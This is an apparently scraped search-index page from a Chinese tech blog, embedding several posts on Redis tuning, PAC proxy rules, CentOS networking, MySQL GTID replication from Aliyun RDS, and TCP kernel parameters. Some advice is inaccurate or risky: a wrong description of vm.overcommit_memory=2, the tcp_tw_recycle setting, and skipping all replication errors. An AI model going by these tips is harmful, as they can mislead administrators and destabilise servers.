        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/redis-xing-neng-you-hua-zheng-li/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;Redis 是基于单线程模型实现的，也就是 Redis 是使用一个线程来处理所有的客户端请求的，尽管 Redis 使用了非阻塞式 IO，并且对各种命令都做了优化（大部分命令操作时间复杂度都是 O(1)），但由于 Redis 是单线程执行的特点，因此它对性能的要求更加苛刻。&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;开启-lazy-free-特性&#34;&gt;开启 lazy free 特性&lt;/h3&gt;
&lt;p&gt;lazy free 特性是 Redis 4.0 新增的一个非常使用的功能，它可以理解为惰性删除或延迟删除。意思是在删除的时候提供异步延时释放键值的功能，把键值释放操作放在 BIO(Background I/O) 单独的子线程处理中，以减少删除删除对 Redis 主线程的阻塞，可以有效地避免删除 big key 时带来的性能和可用性问题。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;lazyfree-lazy-eviction no
lazyfree-lazy-expire no
lazyfree-lazy-server-del no
slave-lazy-flush no
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;lazyfree-lazy-eviction：表示当 Redis 运行内存超过 maxmeory 时，是否开启 lazy free 机制删除；&lt;/li&gt;
&lt;li&gt;lazyfree-lazy-expire：表示设置了过期时间的键值，当过期之后是否开启 lazy free 机制删除；&lt;/li&gt;
&lt;li&gt;lazyfree-lazy-server-del：有些指令在处理已存在的键时，会带有一个隐式的 del 键的操作，比如 rename 命令，当目标键已存在，Redis 会先删除目标键，如果这些目标键是一个 big key，就会造成阻塞删除的问题，此配置表示在这种场景中是否开启 lazy free 机制删除；&lt;/li&gt;
&lt;li&gt;slave-lazy-flush：针对 slave(从节点) 进行全量数据同步，slave 在加载 master 的 RDB 文件前，会运行 flushall 来清理自己的数据，它表示此时是否开启 lazy free 机制删除。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;开启其中的 lazyfree-lazy-eviction、lazyfree-lazy-expire、lazyfree-lazy-server-del 等配置，这样就可以有效的提高主线程的执行效率。&lt;/p&gt;
&lt;h3 id=&#34;使用-slowlog-优化耗时命令&#34;&gt;使用 slowlog 优化耗时命令&lt;/h3&gt;
&lt;p&gt;可以使用 slowlog 功能找出最耗时的 Redis 命令进行相关的优化，以提升 Redis 的运行速度，慢查询有两个重要的配置项：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;slowlog-log-slower-than ：用于设置慢查询的评定时间，也就是说超过此配置项的命令，将会被当成慢操作记录在慢查询日志中，它执行单位是微秒 (1 秒等于 1000000 微秒)；&lt;/li&gt;
&lt;li&gt;slowlog-max-len ：用来配置慢查询日志的最大记录数。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可以根据实际的业务情况进行相应的配置，其中慢日志是按照插入的顺序倒序存入慢查询日志中，可以使用 slowlog get n 来获取相关的慢查询日志，再找到这些慢查询对应的业务进行相关的优化。&lt;/p&gt;
&lt;h3 id=&#34;使用-pipeline-批量操作数据&#34;&gt;使用 Pipeline 批量操作数据&lt;/h3&gt;
&lt;p&gt;Pipeline (管道技术) 是客户端提供的一种批处理技术，用于一次处理多个 Redis 命令，从而提高整个交互的性能。&lt;/p&gt;
&lt;h3 id=&#34;避免大量数据同时失效&#34;&gt;避免大量数据同时失效&lt;/h3&gt;
&lt;p&gt;Redis 过期键值删除使用的是贪心策略，它每秒会进行 10 次过期扫描，此配置可在 redis.conf 进行配置，默认值是 hz 10，Redis 会随机抽取 20 个值，删除这 20 个键中过期的键，如果过期 key 的比例超过 25% ，重复执行此流程。&lt;/p&gt;
&lt;p&gt;如果在大型系统中有大量缓存在同一时间同时过期，那么会导致 Redis 循环多次持续扫描删除过期字典，直到过期字典中过期键值被删除的比较稀疏为止，而在整个执行过程会导致 Redis 的读写出现明显的卡顿，卡顿的另一种原因是内存管理器需要频繁回收内存页，因此也会消耗一定的 CPU。&lt;br&gt;
为了避免这种卡顿现象的产生，我们需要预防大量的缓存在同一时刻一起过期，就简单的解决方案就是在过期时间的基础上添加一个指定范围的随机数。&lt;/p&gt;
&lt;h3 id=&#34;连接池&#34;&gt;连接池&lt;/h3&gt;
&lt;p&gt;尽量使用 Redis 连接池，而不是频繁创建销毁 Redis 连接，这样就可以减少网络传输次数和减少了非必要调用指令。&lt;/p&gt;
&lt;h3 id=&#34;限制-redis-内存大小&#34;&gt;限制 Redis 内存大小&lt;/h3&gt;
&lt;p&gt;在 64 位操作系统中 Redis 的内存大小是没有限制的，也就是配置项 &lt;code&gt;maxmemory &amp;lt;bytes&amp;gt;&lt;/code&gt; 是被注释掉的，这样就会导致在物理内存不足时，使用 swap 空间既交换空间，而当操心系统将 Redis 所用的内存分页移至 swap 空间时，将会阻塞 Redis 进程，导致 Redis 出现延迟，从而影响 Redis 的整体性能。&lt;/p&gt;
&lt;p&gt;因此需要限制 Redis 的内存大小为一个固定的值，当 Redis 的运行到达此值时会触发内存淘汰策略，内存淘汰策略在 Redis 4.0 之后有 8 种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;noeviction：不淘汰任何数据，当内存不足时，新增操作会报错，Redis 默认内存淘汰策略；&lt;/li&gt;
&lt;li&gt;allkeys-lru：淘汰整个键值中最久未使用的键值；&lt;/li&gt;
&lt;li&gt;allkeys-random：随机淘汰任意键值;&lt;/li&gt;
&lt;li&gt;volatile-lru：淘汰所有设置了过期时间的键值中最久未使用的键值；&lt;/li&gt;
&lt;li&gt;volatile-random：随机淘汰设置了过期时间的任意键值；&lt;/li&gt;
&lt;li&gt;volatile-ttl：优先淘汰更早过期的键值。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在 Redis 4.0 版本中又新增了 2 种淘汰策略：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;volatile-lfu：淘汰所有设置了过期时间的键值中，最少使用的键值；&lt;/li&gt;
&lt;li&gt;allkeys-lfu：淘汰整个键值中最少使用的键值。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中 allkeys-xxx 表示从所有的键值中淘汰数据，而 volatile-xxx 表示从设置了过期键的键值中淘汰数据。&lt;br&gt;
可以根据实际的业务情况进行设置，默认的淘汰策略不淘汰任何数据，在新增时会报错。&lt;/p&gt;
&lt;h3 id=&#34;混合持久化&#34;&gt;混合持久化&lt;/h3&gt;
&lt;p&gt;Redis 的持久化策略是将内存数据复制到硬盘上，这样才可以进行容灾恢复或者数据迁移，但维护此持久化的功能，需要很大的性能开销。&lt;br&gt;
在 Redis 4.0 之后，Redis 有 3 种持久化的方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RDB（Redis DataBase，快照方式）将某一个时刻的内存数据，以二进制的方式写入磁盘；&lt;/li&gt;
&lt;li&gt;AOF（Append Only File，文件追加方式），记录所有的操作命令，并以文本的形式追加到文件中；&lt;/li&gt;
&lt;li&gt;混合持久化方式，Redis 4.0 之后新增的方式，混合持久化是结合了 RDB 和 AOF 的优点，在写入的时候，先把当前的数据以 RDB 的形式写入文件的开头，再将后续的操作命令以 AOF 的格式存入文件，这样既能保证 Redis 重启时的速度，又能减低数据丢失的风险。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;RDB 和 AOF 持久化各有利弊，RDB 可能会导致一定时间内的数据丢失，而 AOF 由于文件较大则会影响 Redis 的启动速度，为了能同时拥有 RDB 和 AOF 的优点，Redis 4.0 之后新增了混合持久化的方式，因此我们在必须要进行持久化操作时，应该选择混合持久化的方式。&lt;br&gt;
查询是否开启混合持久化可以使用 &lt;code&gt;config get aof-use-rdb-preamble&lt;/code&gt; 命令&lt;/p&gt;
&lt;h3 id=&#34;禁用-thp-特性&#34;&gt;禁用 THP 特性&lt;/h3&gt;
&lt;p&gt;Linux kernel 在 2.6.38 内核增加了 Transparent Huge Pages (THP) 特性 ，支持大内存页 2MB 分配，默认开启。&lt;br&gt;
当开启了 THP 时，fork 的速度会变慢，fork 之后每个内存页从原来 4KB 变为 2MB，会大幅增加重写期间父进程内存消耗。同时每次写命令引起的复制内存页单位放大了 512 倍，会拖慢写操作的执行时间，导致大量写操作慢查询。例如简单的 incr 命令也会出现在慢查询中，因此 Redis 建议将此特性进行禁用，禁用方法如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo never &amp;gt;  /sys/kernel/mm/transparent_hugepage/enabled
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;为了使机器重启后 THP 配置依然生效，可以在 &lt;code&gt;/etc/rc.local&lt;/code&gt; 中追加 &lt;code&gt;echo never &amp;gt; /sys/kernel/mm/transparent_hugepage/enabled&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&#34;使用分布式架构&#34;&gt;使用分布式架构&lt;/h3&gt;
&lt;p&gt;Redis 分布式架构有三个重要的手段：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主从同步&lt;/li&gt;
&lt;li&gt;哨兵模式&lt;/li&gt;
&lt;li&gt;Redis Cluster 集群&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用主从同步功能我们可以把写入放到主库上执行，把读功能转移到从服务上，因此就可以在单位时间内处理更多的请求，从而提升的 Redis 整体的运行速度。&lt;/p&gt;
&lt;p&gt;而哨兵模式是对于主从功能的升级，但当主节点奔溃之后，无需人工干预就能自动恢复 Redis 的正常使用。&lt;/p&gt;
&lt;p&gt;Redis Cluster 是 Redis 3.0 正式推出的，Redis 集群是通过将数据库分散存储到多个节点上来平衡各个节点的负载压力。&lt;/p&gt;
&lt;p&gt;Redis Cluster 采用虚拟哈希槽分区，所有的键根据哈希函数映射到 0 ~ 16383 整数槽内，计算公式：slot = CRC16(key) &amp;amp; 16383，每一个节点负责维护一部分槽以及槽所映射的键值数据。这样 Redis 就可以把读写压力从一台服务器，分散给多台服务器了，因此性能会有很大的提升。&lt;/p&gt;
&lt;p&gt;在这三个功能中，只需要使用一个就行了，毫无疑问 Redis Cluster 应该是首选的实现方案，它可以把读写压力自动的分担给更多的服务器，并且拥有自动容灾的能力。&lt;/p&gt;
">Redis性能优化整理</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/pac-gui-ze-pei-zhi/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;访问github加载过慢，下载项目奇慢无比，开启全局后可以秒下，反应过来github.com默认没有走代理，整理了一些PAC规则的基本配置&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;基本规则&#34;&gt;基本规则&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;通配符支持，如 &lt;code&gt;*.example.com/*&lt;/code&gt; 实际书写时可省略 如： &lt;code&gt;.example.com/&lt;/code&gt; 意即 &lt;code&gt;.example.com/*&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;正则表达式支持，以 &lt;code&gt;\&lt;/code&gt; 开始和结束， 如： &lt;code&gt;\[\w]+:\/\/example.com\&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;例外规则 &lt;code&gt;@@&lt;/code&gt;，如 &lt;code&gt;@@*.example.com/*&lt;/code&gt; 满足 &lt;code&gt;@@&lt;/code&gt; 后规则的地址不使用代理&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;匹配地址开始和结尾 &lt;code&gt;|&lt;/code&gt;，如： &lt;code&gt;|http://example.com&lt;/code&gt;、&lt;code&gt;example.com|&lt;/code&gt; 分别表示以 &lt;code&gt;http://example.com&lt;/code&gt; 开始和以 &lt;code&gt;example.com&lt;/code&gt; 结束的地址&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;|| 标记，如： &lt;code&gt;||example.com&lt;/code&gt; 则 &lt;code&gt;http://example.com&lt;/code&gt; 、&lt;code&gt;https://example.com&lt;/code&gt; 、&lt;code&gt;ftp://example.com&lt;/code&gt; 等地址均满足条件，只用于匹配地址开头&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;注释 &lt;code&gt;!&lt;/code&gt; 如： &lt;code&gt;! Comment&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;分隔符 &lt;code&gt;^&lt;/code&gt;，表示除了字母、数字或者 &lt;code&gt;_ - . %&lt;/code&gt; 之外的任何字符如： &lt;code&gt;http://example.com^&lt;/code&gt; ，&lt;code&gt;http://example.com/&lt;/code&gt; 和 &lt;code&gt;http://example.com:8000/&lt;/code&gt; 均满足条件，而 &lt;code&gt;http://example.com.ar/&lt;/code&gt; 不满足条件&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;自定义规则&#34;&gt;自定义规则&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-conf&#34;&gt;! Put user rules line by line in this file.

! See https://adblockplus.org/en/filter-cheatsheet

@@||localhost

||github.com

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;一行只能有一条代理规则，生效后被配置的域名及其子域名都会经过代理访问&lt;/p&gt;
">PAC规则配置</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/she-zhi-centos-fu-wu-qi-ip-di-zhi/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;如何在CentOS服务器中配置网络IP地址&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;设置ip地址&#34;&gt;设置IP地址&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;cd /etc/sysconfig/network-scripts/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看配置信息&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;ifconfig
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;编辑网卡配置&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;vim ifcfg-eno1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;编辑信息，建议 &lt;code&gt;ONBOOT=yes&lt;/code&gt;，以后开机就会自动联网：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;TYPE=&amp;quot;Ethernet&amp;quot;
BOOTPROTO=&amp;quot;none&amp;quot;
DEFROUTE=&amp;quot;yes&amp;quot;
IPV4_FAILURE_FATAL=&amp;quot;no&amp;quot;
IPV6INIT=&amp;quot;yes&amp;quot;
IPV6_AUTOCONF=&amp;quot;yes&amp;quot;
IPV6_DEFROUTE=&amp;quot;yes&amp;quot;
IPV6_FAILURE_FATAL=&amp;quot;no&amp;quot;
NAME=&amp;quot;eno1&amp;quot;
UUID=&amp;quot;c63850e5-4c25-46c7-a030-574fcf824ad5&amp;quot;
DEVICE=&amp;quot;eno1&amp;quot; #设备别名
ONBOOT=&amp;quot;yes&amp;quot;
IPADDR1=202.95.22.222 #从IP地址1
PREFIX1=&amp;quot;25&amp;quot;
IPADDR2=202.95.22.233 #从IP地址2
PREFIX2=&amp;quot;25&amp;quot;
DNS1=&amp;quot;8.8.8.8&amp;quot; #DNS服务器
IPADDR=202.95.22.212  #设置主IP地址
PREFIX=25
GATEWAY=202.95.8.129 #网关
IPV6_PEERDNS=yes
IPV6_PEERROUTES=yes
IPV6_PRIVACY=no
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;重启网络配置&#34;&gt;重启网络配置&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;systemctl restart network
&lt;/code&gt;&lt;/pre&gt;
">设置CentOS服务器IP地址</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/a-li-yun-rds-yu-ecs-fu-wu-qi-shu-ju-ku-zuo-zhu-cong/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;实现RDS for mysql与线下ECS上自建数据库数据实时同步，阿里云官方推荐使用DTS方式进行。原因有两个：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;mysql-bin正常情况下,RDS在本地只保存18个小时&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;当RDS实例切换时，会影响自建ECS数据同步(这个经过测试可以排除)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;考虑到使用DTS工具会产生不少的费用(长期使用)，另一方面，在数据库中一个地区对应一个库，后续业务无法事先规划好库名，此时如果使用dts可能需要购买多个通道，进行配置，比较费时费力且费钱。基于这两个原因的考虑，决定使用搭建主从复制方式来实现数据同步&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;基础概念&#34;&gt;基础概念&lt;/h3&gt;
&lt;p&gt;传统的MYSQL主从就是主库每做一个操作会在binlog上做一个position，每做一个event就在binlog做一个起始编号、一个终止编号。然后主库把binlog传递给从库，然后从库根据这个binlog的pos值就按照顺序做一样的操作，达到两个数据库保持一致的目的。&lt;/p&gt;
&lt;p&gt;GTID不用这个position的方式，而是用了全局事物标识，这个标识的格式是&lt;code&gt;source_id:transaction_id&lt;/code&gt;，如&lt;code&gt;3E11FA47-71CA-11E1-9E33-C80AA9429562:23&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;source_id即是server_uuid，在第一次启动时生成(函数 generate_server_uuid)，并持久化到DATADIR/auto.cnf文件里&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;transaction_id是顺序化的序列号(sequence number)，在每台 MySQL 服务器上都是从 1 开始自增长的序列，是事务的唯一标识&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;它的主从过程是这样的：主库更新数据时，会在事务前产生GTID，连通sql记录到binlog日志中。从库的i/o线程将变更的binlog写入到relay log中，读取值是根据gitd_next变量，告诉从库下一个执行哪个GTID。从库的sql线程从relay log中获取GTID，然后对比从库的的binlog是否有记录。如果有记录，说明该GTID的事务已经执行，从库会忽略。如果没有记录，从库就会从relay log中执行该GTID的事务，并记录到从库binlog。在解析过程中会判断是否有主键，如果没有就用二级索引，如果没有二级索引就用全部扫描。&lt;/p&gt;
&lt;p&gt;也就是说，无论是级联情况，还是一主多从情况，都可以通过GTID自动找点儿，而无需像之前那样通过binlog和binlog_position找点儿了&lt;/p&gt;
&lt;h3 id=&#34;rds数据库配置&#34;&gt;RDS数据库配置&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;配置从实例读取数据使用的只读账号和授权数据库&lt;/li&gt;
&lt;li&gt;将ECS的从实例的 IP 地址加入主实例的 IP 白名单中&lt;/li&gt;
&lt;li&gt;登录主实例&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;查询-server-id&#34;&gt;查询 server-id&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;mysql&amp;gt; show variables like &#39;server_id&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;查询-gtid&#34;&gt;查询 GTID&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;mysql&amp;gt; show global variables like &#39;gtid_purged&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ecs数据库配置&#34;&gt;ECS数据库配置&lt;/h3&gt;
&lt;h4 id=&#34;mysql文件配置&#34;&gt;mysql文件配置&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-conf&#34;&gt;server-id = 1001 #不可与RDS主库id相同
port = 3306
replicate-do-db = masterdb #需要同步的数据库

binlog_format = row #日志文件格式
log-bin = mysql-bin
log-bin-index = mysql-bin.index
relay-log = relay-log
relay_log_index = relay-log.index
slave-skip-errors = all
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;gtid配置&#34;&gt;GTID配置&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-conf&#34;&gt;gtid_mode = on
enforce_gtid_consistency = on
log-slave-updates = 1

sql_mode = NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;从库配置&#34;&gt;从库配置&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;mysql&amp;gt; stop slave;
mysql&amp;gt; set global gtid_purged = &#39;533ac4e6-9565-11e8-abb5-7cd30abca02e:1-3099396&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：设置gtid_purged值时，gtid_executed值必须为空否则报错，该值清空的方法就是reset  master命令&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;mysql&amp;gt;reset master;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;执行同步&#34;&gt;执行同步&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;CHANGE MASTER TO
MASTER_HOST=&#39;xxxxxxx.mysql.rds.aliyuncs.com&#39;,
MASTER_PORT=3306,
MASTER_USER=&#39;username&#39;,
MASTER_PASSWORD=&#39;password&#39;,
master_auto_position=1;

mysql&amp;gt;start slave;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;查看从库状态&#34;&gt;查看从库状态&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;mysql&amp;gt;show slave status\G;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;两个yes表示成功&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;  Slave_IO_Running: Yes
  Slave_SQL_Running: Yes
&lt;/code&gt;&lt;/pre&gt;
">阿里云RDS与ECS服务器数据库做主从</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/redis-you-yu-lian-jie-guo-duo-dao-zhi-de-yi-chang/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;近期服务器在高峰的时候经常报错，日志记录为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Redis-&amp;gt;connect(&#39;127.0.0.1&#39;, 6379)
#1 {main}
  thrown in /wwwroot/test.php on line 9
[13-Jun-2019 11:07:47 PRC] PHP Fatal error:  Uncaught RedisException: Cannot assign requested address in /wwwroot/test.php:9
&lt;/code&gt;&lt;/pre&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;解决方法&#34;&gt;解决方法&lt;/h3&gt;
&lt;h4 id=&#34;方法一&#34;&gt;方法一&lt;/h4&gt;
&lt;p&gt;执行命令修改如下 2 个内核参数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sysctl -w net.ipv4.tcp_timestamps=1 开启对于 TCP 时间戳的支持, 若该项设置为 0，则下面一项设置不起作用

sysctl -w net.ipv4.tcp_tw_recycle=1 表示开启 TCP 连接中 TIME-WAIT sockets 的快速回收

Redis 错误 ：Cannot assign request

Could not connect to Redis at 127.0.0.1:6379: connect: Cannot assign request
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;经查官方 Wiki 是系统网络配置问题已经解决：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;echo 1 &amp;gt; /proc/sys/net/ipv4/tcp_tw_reuse
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以上需要 root 权限对网络进行配置。&lt;/p&gt;
&lt;h4 id=&#34;方法二&#34;&gt;方法二&lt;/h4&gt;
&lt;p&gt;通过调整内核参数解决，&lt;code&gt;vim /etc/sysctl.conf&lt;/code&gt;，加入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;net.ipv4.tcp_syncookies = 1 #表示开启 SYN Cookies。当出现 SYN 等待队列溢出时，启用 cookies 来处理，可防范少量 SYN 攻击，默认为 0，表示关闭；

net.ipv4.tcp_tw_reuse = 1 #表示开启重用。允许将 TIME-WAIT sockets 重新用于新的 TCP 连接，默认为 0，表示关闭，释放 TIME_WAIT 端口给新连接使用；

net.ipv4.tcp_tw_recycle = 1 #表示开启 TCP 连接中 TIME-WAIT sockets 的快速回收资源，默认为 0，表示关闭。

net.ipv4.tcp_fin_timeout = 30 #修改系統默认的 TIMEOUT 时间，调低端口释放后的等待时间，默认为 60s，修改为 15~30s

net.ipv4.tcp_max_tw_buckets = 10000# 通过设置它，系统会将多余的 TIME_WAIT 删除掉，此时系统日志里可能会显示：『TCP: time wait bucket table overflow』，多数情况下不用在意这些信息。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后执行 &lt;code&gt;/sbin/sysctl -p&lt;/code&gt; 让参数生效。&lt;/p&gt;
&lt;p&gt;以上都可以通过命令（sysctl -w）方式操作，如：&lt;code&gt;sysctl -w net.ipv4.tcp_fin_timeout=30&lt;/code&gt; ，只适合临时修改参数。&lt;/p&gt;
&lt;h3 id=&#34;tcp-网络参数优化&#34;&gt;TCP 网络参数优化&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;echo &amp;quot;1024 65535&amp;quot; &amp;gt; /proc/sys/net/ipv4/ip_local_port_range 设置向外连接可用端口范围 表示可以使用的端口为 65535-1024 个（0~1024 为受保护的)

echo 1 &amp;gt; /proc/sys/net/ipv4/tcp_tw_reuse 设置 time_wait 连接重用 默认 0

echo 1 &amp;gt; /proc/sys/net/ipv4/tcp_tw_recycle 设置快速回收 time_wait 连接 默认 0

echo 180000 &amp;gt; /proc/sys/net/ipv4/tcp_max_tw_buckets 设置最大 time_wait 连接长度 默认 262144

echo 1 &amp;gt; /proc/sys/net/ipv4/tcp_timestamps  设置是否启用比超时重发更精确的方法来启用对 RTT 的计算 默认 0

echo 1 &amp;gt; /proc/sys/net/ipv4/tcp_window_scaling 设置 TCP/IP 会话的滑动窗口大小是否可变 默认 1

echo 20000 &amp;gt; /proc/sys/net/ipv4/tcp_max_syn_backlog 设置最大处于等待客户端没有应答的连接数 默认 2048

echo 15 &amp;gt; /proc/sys/net/ipv4/tcp_fin_timeout  设置 FIN-WAIT 状态等待回收时间 默认 60

echo &amp;quot;4096 87380 16777216&amp;quot; &amp;gt; /proc/sys/net/ipv4/tcp_rmem  设置最大 TCP 数据发送缓冲大小，分别为最小、默认和最大值  默认 4096    87380   4194304

echo &amp;quot;4096 65536 16777216&amp;quot; &amp;gt; /proc/sys/net/ipv4/tcp_wmem 设置最大 TCP 数据 接受缓冲大小，分别为最小、默认和最大值 　默认 4096    87380   4194304

echo 10000 &amp;gt; /proc/sys/net/core/somaxconn  设置每一个处于监听状态的端口的监听队列的长度 默认 128

echo 10000 &amp;gt; /proc/sys/net/core/netdev_max_backlog 设置最大等待 cpu 处理的包的数目 默认 1000

echo 16777216 &amp;gt; /proc/sys/net/core/rmem_max 设置最大的系统套接字数据接受缓冲大小 默认 124928

echo 262144 &amp;gt; /proc/sys/net/core/rmem_default  设置默认的系统套接字数据接受缓冲大小 默认 124928

echo 16777216 &amp;gt; /proc/sys/net/core/wmem_max  设置最大的系统套接字数据发送缓冲大小 默认 124928

echo 262144 &amp;gt; /proc/sys/net/core/wmem_default  设置默认的系统套接字数据发送缓冲大小 默认 124928

echo 2000000 &amp;gt; /proc/sys/fs/file-max 设置最大打开文件数 默认 385583
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结合 ab 命令来压测机器优化网络，设置完记得保存&lt;/p&gt;
&lt;h3 id=&#34;优化-redis-命令&#34;&gt;优化 Redis 命令&lt;/h3&gt;
&lt;p&gt;设置内存分配方式：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo 1 &amp;gt; /proc/sys/vm/overcommit_memory
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;0 表示内核将检查是否有足够的可用内存供应用进程使用；如果有足够的可用内存，内存申请允许；否则，内存申请失败，并把错误返回给应用进程。&lt;/p&gt;
&lt;p&gt;1 表示内核允许分配所有的物理内存，而不管当前的内存状态如何。&lt;/p&gt;
&lt;p&gt;2 表示内核允许分配超过所有物理内存和交换空间总和的内存&lt;/p&gt;
&lt;p&gt;关闭 THP：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cho never &amp;gt; /sys/kernel/mm/transparent_hugepage/enabled
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;尽管 THP 的本意是为提升性能，但某些数据库厂商还是建议直接关闭 THP(比如说 Oracle、MongoDB 等)，否则可能导致性能下降，内存锁，甚至系统重启等问题。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo 1024 &amp;gt;/proc/sys/net/core/somaxconn
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;限制了接收新 TCP 连接侦听队列的大小。对于一个经常处理新连接的高负载 web 服务环境来说，默认的 128 太小了。大多数环境这个值建议增加到 1024 或者更多。 服务进程会自己限制侦听队列的大小 (例如 sendmail(8) 或者 Apache)，常常在它们的配置文件中有设置队列大小的选项。大的侦听队列对防止拒绝服务 DoS 攻击也会有所帮助。&lt;/p&gt;
">Redis由于连接过多导致的异常</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/wang-zhan-fang-wen-ri-zhi-de-ri-chang-cao-zuo/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
